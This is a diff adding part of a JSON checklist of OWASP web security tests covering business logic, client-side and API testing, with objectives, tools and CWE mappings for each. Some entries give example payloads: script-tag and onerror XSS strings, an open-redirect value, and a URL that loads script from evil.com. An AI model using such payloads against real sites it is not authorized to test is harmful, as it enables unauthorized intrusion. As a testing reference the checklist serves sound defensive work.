+        "objectives": "- Review the project documentation for components of the system that move, store, or handle data.\n- Determine what type of data is logically acceptable by the component and what types the system should guard against.\n- Determine who should be allowed to modify or read that data in each component.\n- Attempt to insert, update, or delete data values used by each component that should not be allowed per the business logic workflow.",
+        "tools": "Burp Proxy",
+        "owasp": "A4",
+        "cwe": "CWE-840, CWE-472"
+      },
+      {
+        "wstgId": "WSTG-BUSL-04",
+        "name": "Test for Process Timing",
+        "objectives": "- Review the project documentation for system functionality that may be impacted by time. Such as execution time or actions that\nhelp users predict a future outcome or allow one to circumvent\nany part of the business logic or workflow. For example, not\ncompleting transactions in an expected time.\n- Develop and execute the mis-use cases ensuring that attackers\ncan not gain an advantage based on any timing (Race Condition).",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A4",
+        "cwe": "CWE-840, CWE-362"
+      },
+      {
+        "wstgId": "WSTG-BUSL-05",
+        "name": "Test Number of Times a Function Can Be Used Limits",
+        "objectives": "- Identify functions that must set limits to the times they can be called.\n- Assess if there is a logical limit set on the functions and if it is properly validated.\n- For each of the functions and features found that should only be executed a single time or specified number of times during the business logic workflow, develop abuse/misuse cases that may allow a user to execute more than the allowable number of times.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A4, A7",
+        "cwe": "CWE-799"
+      },
+      {
+        "wstgId": "WSTG-BUSL-06",
+        "name": "Testing for the Circumvention of Work Flows",
+        "objectives": "- Review the project documentation for methods to skip or go through steps in the application process in a different order from the intended business logic flow.\n- Develop a misuse case and try to circumvent every logic flow identified.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A4",
+        "cwe": "CWE-841"
+      },
+      {
+        "wstgId": "WSTG-BUSL-07",
+        "name": "Test Defenses Against Application Misuse",
+        "objectives": "- Generate notes from all tests conducted against the system.\n- Review which tests had a different functionality based on aggressive input.\n- Understand the defenses in place and verify if they are enough to protect the system against bypassing techniques.\n- Measures that might indicate the application has in-built self-defense:\n• Changed responses\n• Blocked requests\n• Actions that log a user out or lock their account",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A4",
+        "cwe": "CWE-693"
+      },
+      {
+        "wstgId": "WSTG-BUSL-08",
+        "name": "Test Upload of Unexpected File Types",
+        "objectives": "- Review the project documentation for file types that are rejected by the system.\n- Verify that the unwelcomed file types are rejected and handled safely. Also, check whether the website only check for \"Content-type\" or file extension.\n- Verify that file batch uploads are secure and do not allow any bypass against the set security measures.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A4",
+        "cwe": "CWE-434, CWE-602"
+      },
+      {
+        "wstgId": "WSTG-BUSL-09",
+        "name": "Test Upload of Malicious Files",
+        "objectives": "- Identify the file upload functionality.\n- Review the project documentation to identify what file types are considered acceptable, and what types would be considered dangerous or malicious.\n- If documentation is not available then consider what would be appropriate based on the purpose of the application.\n- Determine how the uploaded files are processed.\n- Obtain or create a set of malicious files for testing.\n- Try to upload the malicious files to the application and determine whether it is ac",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A4",
+        "cwe": "CWE-434"
+      },
+      {
+        "wstgId": "WSTG-BUSL-10",
+        "name": "Test Payment Functionality",
+        "objectives": "- Determine whether the business logic for the e-commerce functionality is robust.\n- Understand how the payment functionality works.\n- Determine whether the payment functionality is secure.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A4",
+        "cwe": "CWE-472, CWE-602, CWE-807"
+      }
+    ]
+  },
+  {
+    "id": 11,
+    "name": "11. Client Side Testing",
+    "icon": "🖥️",
+    "tests": [
+      {
+        "wstgId": "WSTG-CLNT-01",
+        "name": "Testing for DOM-Based Cross Site Scripting",
+        "objectives": "- Identify DOM sinks.\n- Build payloads that pertain to every sink type. \nFor example: #<script>alert('xss')</script>",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A3",
+        "cwe": "CWE-79"
+      },
+      {
+        "wstgId": "WSTG-CLNT-02",
+        "name": "Testing for JavaScript Execution",
+        "objectives": "- Identify sinks and possible JavaScript injection points.\nFor example: ?javascript:alert(1)",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A3",
+        "cwe": "CWE-79"
+      },
+      {
+        "wstgId": "WSTG-CLNT-03",
+        "name": "Testing for HTML Injection",
+        "objectives": "- Identify HTML injection points and assess the severity of the injected content.\nFor example: page.html?user=<img%20src='aaa'%20onerror=alert(1)>",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A3",
+        "cwe": "CWE-80"
+      },
+      {
+        "wstgId": "WSTG-CLNT-04",
+        "name": "Testing for Client-side URL Redirect",
+        "objectives": "- Identify injection points that handle URLs or paths.\n- Assess the locations that the system could redirect to (Open Redirect).\nFor example: ?redirect=www.fake-target.site",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A4",
+        "cwe": "CWE-601"
+      },
+      {
+        "wstgId": "WSTG-CLNT-05",
+        "name": "Testing for CSS Injection",
+        "objectives": "- Identify CSS injection points.\n- Assess the impact of the injection.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A3",
+        "cwe": "CWE-20"
+      },
+      {
+        "wstgId": "WSTG-CLNT-06",
+        "name": "Testing for Client-side Resource Manipulation",
+        "objectives": "- Identify sinks with weak input validation.\n- Assess the impact of the resource manipulation.\nFor example: www.victim.com/#http://evil.com/js.js",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A3",
+        "cwe": "CWE-20"
+      },
+      {
+        "wstgId": "WSTG-CLNT-07",
+        "name": "Testing Cross Origin Resource Sharing",
+        "objectives": "- Identify endpoints that implement CORS.\n- Ensure that the CORS configuration is secure or harmless.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A5",
+        "cwe": "CWE-942"
+      },
+      {
+        "wstgId": "WSTG-CLNT-08",
+        "name": "Testing for Cross Site Flashing",
+        "objectives": "- Decompile and analyze the application's code.\n- Assess sinks inputs and unsafe method usages.\nFor example: file.swf?lang=http://evil",
+        "tools": "Flare, Flasm, SWF Intruder",
+        "owasp": "A3",
+        "cwe": "CWE-79"
+      },
+      {
+        "wstgId": "WSTG-CLNT-09",
+        "name": "Testing for Clickjacking",
+        "objectives": "- Understand security measures in place.\n- Discover if a website is vulnerable by loading into an iframe, create simple web page that includes a frame containing the target.\n- Assess how strict the security measures are and if they are bypassable.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A5",
+        "cwe": "CWE-1021"
+      },
+      {
+        "wstgId": "WSTG-CLNT-10",
+        "name": "Testing WebSockets",
+        "objectives": "- Identify the usage of WebSockets by inspecting ws:// or wss:// URI scheme.\n- Assess its implementation by using the same tests on normal HTTP channels.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A2, A3",
+        "cwe": "CWE-319, CWE-1347"
+      },
+      {
+        "wstgId": "WSTG-CLNT-11",
+        "name": "Testing Web Messaging",
+        "objectives": "- Assess the security of the message's origin.\n- Validate that it's using safe methods and validating its input.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A5",
+        "cwe": "CWE-1020"
+      },
+      {
+        "wstgId": "WSTG-CLNT-12",
+        "name": "Testing Browser Storage",
+        "objectives": "- Determine whether the website is storing sensitive data in client-side storage.\n- The code handling of the storage objects should be examined for possibilities of injection attacks, such as utilizing unvalidated input or vulnerable libraries.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A1, A4",
+        "cwe": "CWE-312, CWE-313, CWE-315, CWE-922"
+      },
+      {
+        "wstgId": "WSTG-CLNT-13",
+        "name": "Testing for Cross Site Script Inclusion",
+        "objectives": "- Locate sensitive data across the system.\n- Assess the leakage of sensitive data through various techniques.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A3",
+        "cwe": "CWE-79"
+      },
+      {
+        "wstgId": "WSTG-CLNT-14",
+        "name": "Testing for Reverse Tabnabbing",
+        "objectives": "N/A",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A3",
+        "cwe": "CWE-1022"
+      }
+    ]
+  },
+  {
+    "id": 12,
+    "name": "12. API Testing",
+    "icon": "🔌",
+    "tests": [
+      {
+        "wstgId": "WSTG-APIT-01",
+        "name": "Testing GraphQL",
+        "objectives": "- Assess that a secure and production-ready configuration is deployed.\n- Validate all input fields against generic attacks.\n- Ensure that proper access controls are applied.",
+        "tools": "Burpsuite/ZAP, GraphSQL Raider",
+        "owasp": "A3",
+        "cwe": "CWE-1347"
+      }
+    ]
+  }
+]
